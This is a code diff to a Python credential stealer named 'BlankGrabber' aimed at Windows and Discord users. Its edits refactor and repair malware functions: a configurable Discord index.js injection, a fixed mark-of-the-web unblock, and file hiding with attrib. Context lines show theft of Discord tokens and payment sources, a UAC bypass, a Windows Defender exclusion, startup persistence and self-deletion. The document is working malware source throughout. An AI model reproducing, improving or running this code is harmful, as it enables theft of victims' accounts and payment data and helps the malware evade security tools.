@@ -38,8 +38,8 @@ STARTUP = _config.get('STARTUP', True) # Puts the grabber in startup
 DELETE_ITSELF = _config.get('DELETE_ITSELF', True) # Deletes the grabber after use
 MESSAGE_BOX = _config.get('MSGBOX', dict()) # Custom Message box
 BLOCK_SITES = _config.get('BLOCK_SITES', False) # Blocks security related websites
+INJECT_JS = _config.get('INJECT_JS', True) # Modify discord's index.js
 CAPTURE_WEBCAM = False # Takes photo from the webcam (causes bugs, use at own risk)
-INJECT_JS = True # Modify discord's index.js
 
 class system:
     STARTUPDIR = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp'
@@ -218,11 +218,12 @@ class utils:
     def tree(path, DName= None) -> str:
         if DName is None:
             DName = os.path.basename(path)
-        PIPE = "│"
-        ELBOW = "└──"
-        TEE = "├──"
         tree = subprocess.run("tree /A /F", shell= True, capture_output= True, cwd= path).stdout.decode(errors= 'ignore')
-        tree = tree.replace("+---", TEE).replace(r"\---", ELBOW).replace("|", PIPE).splitlines()
+        #PIPE = "│"
+        #ELBOW = "└──"
+        #TEE = "├──"
+        #tree = tree.replace("+---", TEE).replace(r"\---", ELBOW).replace("|", PIPE)
+        tree = tree.splitlines()
         tree = DName + "\n" + "\n".join(tree[3:])
         return tree.strip()
 
@@ -637,17 +638,15 @@ class Discord:
                 phone = r['phone'] if r['phone'] else '(No Phone Number)'
                 verified=r['verified']
                 mfa = r['mfa_enabled']
-                nitro_data = r.get('premium_type', 0)
-                if nitro_data == 0:
-                    nitro_data = 'No Nitro'
-                elif nitro_data == 1:
-                    nitro_data = 'Nitro Classic'
-                elif nitro_data == 2:
-                    nitro_data = 'Nitro'
-                elif nitro_data == 3:
-                    nitro_data = 'Nitro Basic'
-                else:
-                    nitro_data = '(Unknown)'
+                nitro_type = r.get('premium_type', 0)
+                nitro_infos = {
+                    0 : 'No Nitro',
+                    1 : 'Nitro Classic',
+                    2 : 'Nitro',
+                    3 : 'Nitro Basic'
+                }
+                nitro_data = nitro_infos.get(nitro_type, '(Unknown)')
+                
 
                 billing = json.loads(Discord.http.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.getHeaders(token)).data.decode())
                 if len(billing) == 0:
@@ -1117,7 +1116,7 @@ class BlankGrabber:
 
 if __name__ == '__main__':
     if FROZEN := hasattr(sys, 'frozen'):
-        Thread(target= system.unblockMOTW, args= (sys.executable), daemon= True).start()
+        Thread(target= system.unblockMOTW, args= (system.getSelf()[0], ), daemon= True).start()
 
     if not system.isAdmin():
         system.UACbypass()
@@ -1157,7 +1156,7 @@ if __name__ == '__main__':
         system.WDexclude(startupfilepath)
     
     if not system.isInStartup() and DELETE_ITSELF and FROZEN:
-        subprocess.run(f"attrib +h +s '{system.getSelf()[0]}'", shell= True, capture_output= True)
+        subprocess.run(f'attrib +h +s "{system.getSelf()[0]}"', shell= True, capture_output= True)
     try:
         BlankGrabber()
         if DELETE_ITSELF and not system.isInStartup():
